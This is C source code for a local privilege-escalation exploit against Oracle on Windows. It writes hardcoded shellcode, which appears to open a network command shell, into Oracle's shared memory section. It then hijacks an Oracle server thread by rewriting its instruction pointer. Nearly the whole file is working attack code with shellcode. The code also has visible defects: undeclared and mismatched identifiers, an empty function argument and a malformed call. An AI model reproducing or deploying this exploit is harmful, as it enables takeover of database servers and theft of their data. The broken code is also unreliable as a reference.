#include <stdio.h>
#include <stdlib.h>
#include<windows.h>
#include<winbase.h>

/*

Oracle process on windows can be open by Everyone group what is  a security flow 


When a local ueser attempts to connect to the Oracle on Windows,  
Four threads are created on the main server process
to handle communcation between user and server.These four threads have a Disrectionary Access Contro List (DACL)
that gives a user permission to open the thread

Exploit open a memory section in the server process and write our shellcode there
When i was creating this That shellcode was written specifically to 0x044D0140. I  do this to prevent  shellcode from being munged in  second 
connection attempt
then  set EIP to point to  our shellcode  

*/
HANDLE hsection=NULL;
unsigned char *p=NULL;


int OpenTheSection(unsigned char * section,DWORD perm);
SIZE_T GetSizeOfTheSection();
int MapTheSection(unsigned int rw);

unsigned char shellcode[]="\x83\xEC\x24\x55\x8B\xEC\xEB\x03\x58\xEB\x05\xE8\xF8\xFF\xFF\xFF""\x83\xC0\x7E\x83\xC0\x7B\x50\x99\x64\x8B\x42\x30\x8B\x40\x0C\x8B""\x70\x1C\xAD\x8B\x48\x08\x51\x52\x8B\x7D\xFC\x8B\x3C\x57\x57\x8B""\x41\x3C\x8B\x7C\x01\x78\x03\xF9\x8B\x5F\x1C\x8B\x77\x20\x8B\x7F""\x24\x03\xF1\x03\xD9\x03\xF9\xAD\x91\x33\xF6\x33\xD2\x8A\x14\x08""\x41\xC1\xCE\x0D\x03\xF2\x84\xD2\x75\xF3\x83\xC7\x02\x5A\x52\x66""\x3B\xF2\x75\xE5\x5A\x5A\x42\x0F\xB7\x4F\xFE\x03\x04\x8B\x89\x44""\x95\x04\x59\x80\xFA\x02\x7E\xAE\x80\xFA\x08\x74\x1E\x52\x80\xFA""\x03\x74\x02\xEB\xA1\x99\x52\x68\x33\x32\x20\x20\x68\x77\x73\x32""\x5F\x54\xFF\xD0\x83\xC4\x0C\x5A\x91\xEB\x8B\x99\xB6\x02\x2B\xE2""\x54\x83\xC2\x02\x52\xFF\xD0\x50\x50\x50\x6A\x06\x6A\x01\x6A\x02""\xFF\x55\x14\x8D\x65\xD4\x50\x99\x52\x52\x52\xBA\x02\xFF\x1A\x0A""\xFE\xC6\x52\x54\x5F\x6A\x10\x57\x50\xFF\x55\x18\x6A\x01\xFF\x75""\xD0\xFF\x55\x1C\x50\x50\xFF\x75\xD0\xFF\x55\x20\x99\x52\x68\x63""\x6D\x64\x20\x54\x5F\x50\x50\x50\x52\x52\xB6\x01\x52\x6A\x0A\x99""\x59\x52\xE2\xFD\x6A\x44\x54\x5E\x42\x54\x56\x51\x51\x51\x52\x51""\x51\x57\x51\xFF\x55\x0C\xFF\x55\x08\x16\x9F\x9F\xB5\x72\x60\xA8""\x6F\x80\x3B\x75\x49\x32\x4C\xE7\xDF";

int WriteShellcode(char *section);


int main(int argc, char *argv[]) {
	HANDLE hThread=NULL;
	DWORD id=0;
	HMODULE k=NULL;
	FARPROC ntq=0;
	FARPROC nts=0;
	unsigned char buff[1024]="";
	unsigned int len=0;
	unsigned int res=0;
	unsigned int pid=0;
	unsigned char *p=0;
	unsigned int tid=0;
	CONTEXT ctx;
	unsigned char *ptr=NULL;
	
	if(argc!=3)
	{
		 
		printf("\tC:\\>%s pid section_name\n\n",argv[0]);
		printf("\twhere  pid is the process OD of Oracle\n ");
		printf("\t and section name is  *oraspawn_buffer_SID*\n");
		printf("\tSID is the database SID-e.g orcl\n\n");
		return 0;
	}
	
	if(WriteShellcode(argv[2]==0))
	{
		return printf("Failed to write to section %s\n",argv[2]);
		
	}
	k=LoadLibrary("kernel32.dll");
	if(!k)
	{
		return printf("Failed to load kernel 32.dll");
		
	}
	mOpenThread=GetProcAddress(k,"OpenThread");
	if(!mOpenThread)
	{
		return printf("Failed to get address of OpenThread");
		
	}
	k=LoadLibrary("ntdll.dll");
	
	if(!k)
	{
		return printf("Failed to load ntdll.dll library");
		
	}
	ntq=GetProcAddress(k,"NtQueryInformationThread");
	if(!ntq)
	{
		return printf("Failed");
		
	}
	tid=atoi(argv[1]);
	while(id<0xFFFF)
	{
		hThread=mOpenThread(THREAD_ALL_ACCESS,TRUE,id);
		if(hThread)
		{
			res=ntq(hThread,0,buff,0x1C,&len);
			if(res!=0xC0000003)
			{
				p=&buff[9];
				pid=(int)*p;
				pid=pid<<8;
				p--;
				pid=pid+(int)*p;
				
				
				if(pid==tid)
				{
					
					printf("%d\n",id);
					ctx.ContextFlags=CONTEXT_INTEGER|CONTEXT_CONTROL;
					if(GetThreadContext(hThread,&ctx)==0)
					{
						return printf("Failed to get context");
						
					}
					ptr=(unsigned char*)&ctx;
					ptr=ptr+184;
					
					//This exploit assumes that the base address of the section is
					//at 0x044D0000. It may vary on diffrent OS, in that case we must alter it.
					memmove(ptr,"\x40\x01\x4D\x04",4);
					if(SetThreadContext(hThread,&ctx)==0)
					return printf("%d\n",GetLastError());
					 
					 					
					
				}
			}
			
			
		}
			hThread=NULL;
	id++;
	}
	

	return 0;
		
}

int WriteShellcode(char *section)
{
	SIZE_T size=0;
	if(OpenTheSection(section,FILE_MAP_WRITE)==0)
	{
		printf("OpenTheSection: Section %s\tError:%d\n",section,GetLastError());
		return 0;
	}
	if(MapTheSection(FILE_MAP_WRITE)==0)
	{
		printf("MapTheSection: Section  %s\tError: %d\n",section,GetLastError());
		return 0;
	}
	size=GetSizeOfSection();
	if(size==0)
	{
		printf("GetSizeOfSection: Section %s\tError: %d\n",section,GetLastError());
		return 0;
		
	}
	printf("Size of section %d\n",size);
	if(size<0x141)
	{
		return 0;
	}
	size=size-0x140;
	if(size<strlen(shellcode))
	{
		return 0;
	}
	
	p=p+0x140;
	
	memmove(p,shellcode,strlen(shellcode));
	return 1;
	
	
}

int OpenTheSection(unsigned char *section ,DWORD perm)
{
	SIZE_T size=0;
	hSection=OpenFileMapping(perm,FALSE,section);
	if(!hSection)
	{
		return 0;
		
	}
	else
	 return 1;
	
	
}

int MapTheSection(unsigned int rw)
{
	p=(char *)MapViewOfFile(hSection,rw,,0,0,0);
	if(!p)
	{
		return 0;
	}
	return 1;
}

SIZE_T GetSizeOfSection()
{
	MEMORY_BASIC_INFORMATION mbi;
	SIZE_T size=0;
	if(!p)
	{
		printf("Address not valid");
		return 0;
		
	}
	ZeroMemory(&mbi,sizeof(mbi));
	size=VirtualQuery(p,&mbi,sizeof(mbi));
	if(size!=28)
	{
		return 0;
	}
	size=mbi.RegionSize;
	printf("Size: %d\n",size);
	return size;
	
	
	
}

